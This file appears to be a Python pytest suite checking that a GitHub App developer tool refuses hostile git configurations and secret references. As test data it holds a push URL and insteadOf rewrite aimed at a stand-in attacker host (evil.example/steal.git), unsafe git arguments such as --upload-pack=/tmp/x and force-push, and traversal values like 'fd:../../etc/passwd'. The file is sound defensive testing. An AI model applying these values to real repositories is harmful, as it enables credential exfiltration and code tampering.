"""GA-00 adversarial regressions against real production entry points.

Provider interactions are explicitly mocked; native, GitHub-hosted and device
acceptance remain separate. No production secret or network request is used.
"""
from __future__ import annotations

import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
from types import SimpleNamespace

import pytest

from devtool import github_app
from devtool.ga00_governance import audit, GovernanceError
from devtool.ga00_secret_journal import opened_journal, journal_path, SecretJournalRefusal
from devtool.lifecycle_convergence import (canonical_secret_reference,
    remote_lifecycle_envelope, LifecycleProjection, signing_projection)


def _git(repo: Path, *argv: str) -> None:
    subprocess.run(['git', '-C', str(repo), *argv], check=True,
                   capture_output=True, text=True)


def _repo(tmp_path: Path) -> Path:
    root = tmp_path / 'checkout'
    root.mkdir()
    _git(root, 'init', '-q')
    _git(root, 'remote', 'add', 'origin', 'https://github.com/Mikeyphw/devtool.git')
    return root


def test_git_origin_checks_fetch_and_push_independently(tmp_path):
    root = _repo(tmp_path)
    github_app._https_origin(root, 'Mikeyphw/devtool')
    _git(root, 'remote', 'set-url', '--push', 'origin', 'https://evil.example/steal.git')
    with pytest.raises(github_app.GitHubAppError, match='EXACT_HTTPS_ORIGIN_OR_PUSH'):
        github_app._https_origin(root, 'Mikeyphw/devtool')


def test_git_rewrites_and_local_credentials_refused(tmp_path):
    root = _repo(tmp_path)
    _git(root, 'config', '--local', 'url.https://evil.example/.insteadOf', 'https://github.com/')
    with pytest.raises(github_app.GitHubAppError, match='REWRITE_OR_CREDENTIAL|EXACT_HTTPS'):
        github_app._https_origin(root, 'Mikeyphw/devtool')
    _git(root, 'config', '--local', '--unset-all', 'url.https://evil.example/.insteadOf')
    github_app._https_origin(root, 'Mikeyphw/devtool')
    _git(root, 'config', '--local', 'http.https://github.com/.extraheader', 'Authorization: secret')
    with pytest.raises(github_app.GitHubAppError, match='REWRITE_OR_CREDENTIAL'):
        github_app._https_origin(root, 'Mikeyphw/devtool')


def test_git_argv_is_operation_allowlisted():
    allowed = [('branch_write', ['push','--porcelain','origin',
                'refs/heads/topic:refs/heads/topic']),
               ('branch_write', ['ls-remote','--exit-code','origin','refs/heads/topic']),
               ('repository_read', ['fetch','--prune','origin'])]
    for capability, argv in allowed:
        github_app._check_git_argv(argv, capability)
    unsafe = [('branch_write',['push','--force','origin','main']),
              ('branch_write',['push','--porcelain','https://evil.example','refs/heads/b:refs/heads/b']),
              ('branch_write',['push','--porcelain','origin','refs/heads/a:refs/heads/b']),
              ('branch_write',['push','--porcelain','origin','refs/heads/../x:refs/heads/../x']),
              ('repository_read',['ls-remote','https://evil.example']),
              ('repository_read',['fetch','--upload-pack=/tmp/x','origin']),
              ('repository_read',['push','--porcelain','origin','refs/heads/a:refs/heads/a'])]
    for capability, argv in unsafe:
        with pytest.raises(github_app.GitHubAppError):
            github_app._check_git_argv(argv, capability)


def test_askpass_prompt_never_reveals_token_to_other_host(tmp_path):
    file = tmp_path/'askpass.py'
    file.write_text(github_app._ASKPASS)
    fake_secret='ghs_GA00_SYNTHETIC_NOT_REAL'
    for prompt, expected in [
        ("Password for 'https://github.com.evil.example': ", None),
        ("Password for 'https://evil.example/Mikeyphw/devtool': ", None),
        ("Password for 'https://github.com/Evil/repo.git': ", None),
        ("Password for 'https://github.com:444/Mikeyphw/devtool.git': ", None),
        ("Password for 'https://github.com/Mikeyphw/devtool.git': ", fake_secret+'\n'),
    ]:
        readfd, writefd = os.pipe()
        try:
            os.write(writefd, fake_secret.encode('ascii'))
        finally:
            os.close(writefd)
        try:
            env={**os.environ, 'DEVTOOL_APP_AUTH_FD':str(readfd),
                 'DEVTOOL_APP_AUTH_REPOSITORY':'Mikeyphw/devtool'}
            p=subprocess.run([sys.executable,str(file),prompt],
                             env=env,pass_fds=(readfd,),capture_output=True,text=True)
            if expected is None:
                assert p.returncode == 2 and not p.stdout
            else:
                assert p.returncode == 0 and p.stdout == expected
        finally:
            os.close(readfd)


def test_git_credential_child_has_isolated_config(monkeypatch,tmp_path):
    root=_repo(tmp_path)
    access=SimpleNamespace(repository='Mikeyphw/devtool',capability='branch_write',
                           token='ghs_GA00_SYNTHETIC_NOT_REAL',expires_at=9999999999)
    monkeypatch.setenv('GIT_CONFIG_COUNT','1')
    monkeypatch.setenv('GIT_SSH_COMMAND','/bin/echo DO_NOT_RUN')
    monkeypatch.setenv('GIT_SSL_NO_VERIFY','true')
    native_run=github_app.subprocess.run
    seen=[]
    def fake_run(argv, **kwargs):
        if 'pass_fds' in kwargs:
            seen.append(kwargs['env'])
            return subprocess.CompletedProcess(argv,0,'','')
        return native_run(argv,**kwargs)
    monkeypatch.setattr(github_app.subprocess,'run',fake_run)
    github_app.run_git_authenticated(root,['push','--porcelain','origin',
        'refs/heads/topic:refs/heads/topic'],access)
    env=seen[0]
    assert env['GIT_CONFIG_NOSYSTEM']=='1'
    assert env['GIT_CONFIG_GLOBAL']==os.devnull
    assert env['GIT_ALLOW_PROTOCOL']=='https'
    assert 'GIT_CONFIG_COUNT' not in env and 'GIT_SSH_COMMAND' not in env
    assert 'GIT_SSL_NO_VERIFY' not in env
    assert access.token not in str(env)


@pytest.mark.parametrize('ref', [
    'token=abc','fd:../../etc/passwd','local:NAME=value','local:UNSAFE VALUE',
    'https://github.com/name','fd:3\npassword=123','secret-provider:../../secret',
    'external-command:curl','private-file:/root/key','keyring:id?token',
])
def test_life_provider_reference_rejects_freeform_secret_sources(ref):
    with pytest.raises(ValueError):
        canonical_secret_reference(ref)


def test_life_remote_and_signing_projections_use_typed_refs():
    p=LifecycleProjection('signing','id','ready',{})
    for good in ('fd:3','local:STORE_PASS','keyring:key-42','secret-provider:life-g3'):
        x=remote_lifecycle_envelope(repository_identity='repo:id',operation='observe',
                                    projection=p,secret_provider_ref=good)
        assert x['secret_provider_ref']==good
    s=signing_projection({'identity_id':'id','key_reference':'alias',
                          'secret_provider':{'kind':'fd','reference':'3'}})
    assert s.facts['secret_provider']=={'kind':'fd','reference':'3'}
    with pytest.raises(ValueError):
        signing_projection({'identity_id':'id','key_reference':'alias',
                            'secret_provider':{'kind':'local','reference':'TOKEN=leak'}})


def test_secret_journal_refuses_ambiguous_secret_write_and_is_owner_only(tmp_path):
    target=tmp_path/'policy.json'
    fields=dict(operation_id='b'*32,name='DEVTOOL_RELEASE_KEY_ALIAS',
                repository='Owner/repo',source_sha='a'*40,signer_sha256='f'*64)
    with opened_journal(target) as j:
        j.record(event='INTENT',**fields)
        assert j.unresolved()==['DEVTOOL_RELEASE_KEY_ALIAS']
        with pytest.raises(SecretJournalRefusal,match='RECONCILIATION_REQUIRED'):
            j.new_operation()
    journal=journal_path(target)
    assert journal.stat().st_mode & 0o777 == 0o600
    raw=journal.read_text()
    assert 'INTENT' in raw and 'secret_value' not in raw
    with opened_journal(target) as j:
        j.record(event='ACK',**fields)
        assert j.unresolved()
        j.record(event='METADATA_PRESENT',**fields)
        assert not j.unresolved()
        assert len(j.new_operation())==32


def test_secret_journal_rejects_symlink_and_world_readable(tmp_path):
    target=tmp_path/'policy.json'
    journal=journal_path(target)
    journal.symlink_to(tmp_path/'absent')
    with pytest.raises(SecretJournalRefusal,match='UNAVAILABLE'):
        with opened_journal(target):
            pass
    journal.unlink()
    journal.write_text('')
    journal.chmod(0o644)
    with pytest.raises(SecretJournalRefusal,match='UNSAFE'):
        with opened_journal(target):
            pass


def test_governance_preview_never_equates_workflows_with_checks():
    policy={'repository':'Mikeyphw/devtool','base_branch':'main',
            'required_workflows':[{'name':'Required A','workflow_id':123},
                                  {'name':'Required B','workflow_id':456}]}
    rulesets=[{'id':26646485,'target':'branch','enforcement':'active',
               'conditions':{'ref_name':{'include':['refs/heads/main'],'exclude':[]}},
               'rules':[{'type':'required_status_checks','parameters':{
                     'required_status_checks':[{'context':'One GitHub status'}]}},
                        {'type':'pull_request','parameters':{'required_approving_review_count':0}}]}]
    value=audit(policy,rulesets,repository='Mikeyphw/devtool')
    assert value['policy_alignment']=='INCONCLUSIVE_OWNER_REVIEW_REQUIRED'
    assert value['minimum_approving_reviews_observed']==0
    assert len(value['required_workflows'])==2
    assert value['observed_required_status_contexts']==['One GitHub status']
    assert value['governance_mutated'] is False
    with pytest.raises(GovernanceError,match='MISMATCH'):
        audit(policy,rulesets,repository='Other/repo')


def test_life_remote_refuses_nested_embedded_tokens_even_in_unrelated_facts():
    for exposed in (
        {'nested': {'note': 'Bearer token=FAKE_SECRET'}},
        {'extra': ['Authorization: ghp_FAKE_LONG_SECRET_12345']},
        {'key': 'https://username:password@example.com/path'},
        {'token_value': 'fake-secret'},
    ):
        p=LifecycleProjection('signing','id','ready',exposed)
        with pytest.raises(ValueError,match='sensitive|secret-like'):
            remote_lifecycle_envelope(repository_identity='repo:id',operation='observe',projection=p)
